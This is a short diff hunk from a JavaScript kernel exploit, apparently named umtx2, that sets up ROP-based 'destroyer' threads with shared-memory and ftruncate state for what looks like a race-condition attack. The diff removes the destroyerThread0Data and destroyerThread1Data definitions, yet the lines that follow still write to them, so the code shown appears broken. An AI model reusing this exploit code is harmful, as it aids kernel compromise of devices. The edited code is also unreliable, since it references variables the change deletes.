@@ -352,16 +352,6 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         lookupThread.push_write4(lookupThreadData.status, threadStatus.EXITED);
     }
 
-    const destroyerThread0Data = {
-        status: alloc(0x4),
-        cpu: alloc(0x8),
-        counter: alloc(0x8),
-        destroyCount: alloc(0x8),
-        shmOpCount: alloc(0x8),
-
-        resStore: alloc(0x8),
-        ftruncateSize: alloc(0x8)
-    };
     const destroyerThread0 = new thread_rop(p, chain, "rop_thread_destroyer0");
     function resetDestroyerThread0State() {
         p.write4(destroyerThread0Data.status, threadStatus.DEFAULT);
@@ -371,16 +361,6 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         p.write4(destroyerThread0Data.shmOpCount, 0);
     }
 
-    const destroyerThread1Data = {
-        status: alloc(0x4),
-        cpu: alloc(0x8),
-        counter: alloc(0x8),
-        destroyCount: alloc(0x8),
-        shmOpCount: alloc(0x8),
-
-        resStore: alloc(0x8),
-        ftruncateSize: alloc(0x8)
-    };
     const destroyerThread1 = new thread_rop(p, chain, "rop_thread_destroyer1");
     function resetDestroyerThread1State() {
         p.write4(destroyerThread1Data.status, threadStatus.DEFAULT);
